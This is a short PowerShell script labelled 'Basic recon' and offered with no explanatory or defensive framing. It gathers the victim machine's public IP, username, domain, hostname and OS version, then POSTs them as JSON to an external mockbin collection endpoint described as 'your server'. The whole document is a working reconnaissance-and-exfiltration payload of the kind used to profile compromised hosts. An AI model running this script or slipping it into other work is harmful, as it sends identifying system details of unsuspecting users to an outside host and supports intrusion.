# Basic recon
$ip = (Invoke-RestMethod -Uri "http://ipinfo.io/json").ip
$user = $env:USERNAME
$domain = $env:USERDOMAIN
$hostname = $env:COMPUTERNAME
$os = (Get-WmiObject Win32_OperatingSystem).Caption

# Format as JSON and POST to your server
$body = @{
  user = $user
  domain = $domain
  hostname = $hostname
  ip = $ip
  os = $os
} | ConvertTo-Json

Invoke-WebRequest -Uri "https://yourmockbin.api.mockbin.io/" -Method POST -Body $body -ContentType "application/json"
